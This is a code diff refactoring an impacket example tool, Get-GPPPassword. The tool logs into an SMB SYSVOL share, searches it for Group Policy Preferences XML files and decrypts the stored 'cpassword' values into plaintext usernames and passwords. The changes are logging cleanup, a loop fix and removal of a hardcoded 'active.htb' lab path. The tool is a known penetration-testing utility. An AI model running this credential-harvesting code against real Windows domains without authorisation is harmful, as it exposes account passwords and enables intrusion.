@@ -11,19 +11,19 @@
 
 import argparse
 import logging
-from xml.dom import minidom
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+import chardet
 import base64
+from xml.dom import minidom
+from io import BytesIO
+
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
 
 from impacket import version
 from impacket.examples import logger
 from impacket.smbconnection import SMBConnection, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB_DIALECT, SessionError, \
     FILE_READ_DATA, FILE_SHARE_READ, FILE_SHARE_WRITE
 from impacket.smb3structs import FILE_DIRECTORY_FILE, FILE_LIST_DIRECTORY
-
-from io import BytesIO
-import chardet
 
 
 class GetGPPasswords(object):
@@ -48,13 +48,13 @@ class GetGPPasswords(object):
             self.smb = SMBConnection(self.host, self.host, sess_port=self.port)
         dialect = self.smb.getDialect()
         if dialect == SMB_DIALECT:
-            logging.info("SMBv1 dialect used")
+            logging.debug("SMBv1 dialect used")
         elif dialect == SMB2_DIALECT_002:
-            logging.info("SMBv2.0 dialect used")
+            logging.debug("SMBv2.0 dialect used")
         elif dialect == SMB2_DIALECT_21:
-            logging.info("SMBv2.1 dialect used")
+            logging.debug("SMBv2.1 dialect used")
         else:
-            logging.info("SMBv3.0 dialect used")
+            logging.debug("SMBv3.0 dialect used")
         return self.smb
 
     def login(self):
@@ -74,16 +74,16 @@ class GetGPPasswords(object):
         self.smb.login(self.username, self.password, domain=self.domain)
 
         if self.smb.isGuestSession() > 0:
-            logging.info("GUEST Session Granted")
+            logging.debug("GUEST Session Granted")
         else:
-            logging.info("USER Session Granted")
+            logging.debug("USER Session Granted")
         self.loggedIn = True
 
     def list_shares(self):
         if self.loggedIn is False:
             logging.error("Not logged in")
             return
-        logging.info("Listing shares ...")
+        logging.info("Listing shares...")
         resp = self.smb.listShares()
         shares = []
         for k in range(len(resp)):
@@ -95,7 +95,7 @@ class GetGPPasswords(object):
         if self.loggedIn is False:
             logging.error("Not logged in")
             return
-        logging.info("Searching *.%s ..." % extension)
+        logging.info("Searching *.%s files..." % extension)
 
         # Breadth-first search algorithm
         files = []
@@ -103,26 +103,23 @@ class GetGPPasswords(object):
         while len(searchdirs) != 0:
             next_dirs = []
             for sdir in searchdirs:
-                if self.verbose == True:
-                    print('[debug] Searching in %s ' % sdir)
+                logging.debug('Searching in %s ' % sdir)
                 for sharedfile in self.smb.listPath(self.share, sdir + '*', password=None):
                     if sharedfile.get_longname() not in ['.', '..']:
                         if sharedfile.is_directory():
-                            if self.verbose == True:
-                                print('    (d) \x1b[94m/%s/\x1b[0m ' % sharedfile.get_longname())
+                            logging.debug('Found directory %s/' % sharedfile.get_longname())
                             next_dirs.append(sdir + sharedfile.get_longname() + '/')
                         else:
-                            if self.verbose == True:
-                                print('    (f) \x1b[95m/%s\x1b[0m ' % sharedfile.get_longname())
                             if sharedfile.get_longname().endswith('.' + extension):
+                                logging.info('Found matching file %s' % (sdir + sharedfile.get_longname()))
                                 files.append(sdir + sharedfile.get_longname())
+                            else:
+                                logging.debug('Found file %s' % sharedfile.get_longname())
             searchdirs = next_dirs
-            if self.verbose == True:
-                print('[debug] Next iteration with %d folders.' % len(next_dirs))
-        if self.verbose == True:
-            print('[debug] Found %d %s files' % (len(files), extension))
-            for f in files:
-                print(' - %s' % f)
+            logging.debug('Next iteration with %d folders.' % len(next_dirs))
+        logging.debug('Found %d %s files' % (len(files), extension))
+        for f in files:
+            logging.debug(' - %s' % f)
         return files
 
     def parse(self, files=[]):
@@ -131,7 +128,6 @@ class GetGPPasswords(object):
             return
         results = []
         for filename in files:
-            # I/O + grep cpassword
             filename = filename.replace('/', '\\')
             fh = BytesIO()
             try:
@@ -147,16 +143,15 @@ class GetGPPasswords(object):
                 root = minidom.parseString(filecontent)
                 properties_list = root.getElementsByTagName("Properties")
                 # todo : handle empty list, no match
-                results.append({
-                    'newname': properties.getAttribute('newName'), # todo : can be empty
-                    'changed': properties.parentNode.getAttribute('changed'),
-                    'cpassword': properties.getAttribute('cpassword'),
-                    'password': self.decrypt_password(properties.getAttribute('cpassword')),
-                    'username': properties.getAttribute('userName'),
-                    'file': filename
-                })
                 for properties in properties_list:
-                    pass
+                    results.append({
+                        'newname': properties.getAttribute('newName'), # todo : can be empty
+                        'changed': properties.parentNode.getAttribute('changed'),
+                        'cpassword': properties.getAttribute('cpassword'),
+                        'password': self.decrypt_password(properties.getAttribute('cpassword')),
+                        'username': properties.getAttribute('userName'),
+                        'file': filename
+                    })
                 fh.close()
             else:
                 print(error_msg)
@@ -178,6 +173,7 @@ class GetGPPasswords(object):
         return pw_dec.decode('utf-16-le')
 
     def show(self, results):
+        print()
         for result in results:
             logging.info(f"NewName\t: {result['newname']}")
             logging.info(f"Changed\t: {result['changed']}")
@@ -199,9 +195,9 @@ def parse_args():
     parser.add_argument("-p", "--password", type=str, required=False, default="", help="SMB Password")
     parser.add_argument("-share", type=str, required=False, default="SYSVOL", help="SMB Share")
     parser.add_argument("-P", "--port", type=int, required=False, default=445, help="Server port")
-    parser.add_argument("-verbose", required=False, default=False, action="store_true", help="")
+    parser.add_argument("-debug", required=False, default=False, action="store_true", help="")
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
-    return vars(parser.parse_args())
+    return parser.parse_args()
 
 
 if __name__ == '__main__':
@@ -209,9 +205,9 @@ if __name__ == '__main__':
     args = parse_args()
 
     # Init the example's logger theme
-    logger.init(args['ts'])
+    logger.init(args.ts)
 
-    if args['verbose'] is True:
+    if args.debug is True:
         logging.getLogger().setLevel(logging.DEBUG)
         # Print the Library's installation path
         logging.debug(version.getInstallationPath())
@@ -219,12 +215,10 @@ if __name__ == '__main__':
         logging.getLogger().setLevel(logging.INFO)
         logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)
 
-    g = GetGPPasswords(args['share'], args['domain'], args['username'], args['password'], args['server'], args['port'],
-                       verbose=args['verbose'])
+    g = GetGPPasswords(args.share, args.domain, args.username, args.password, args.server, args.port)
     g.login()
     g.list_shares()
-    # files = g.find_files()
-    files = ['/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml']
+    files = g.find_files()
     results = g.parse(files)
     g.show(results)
 
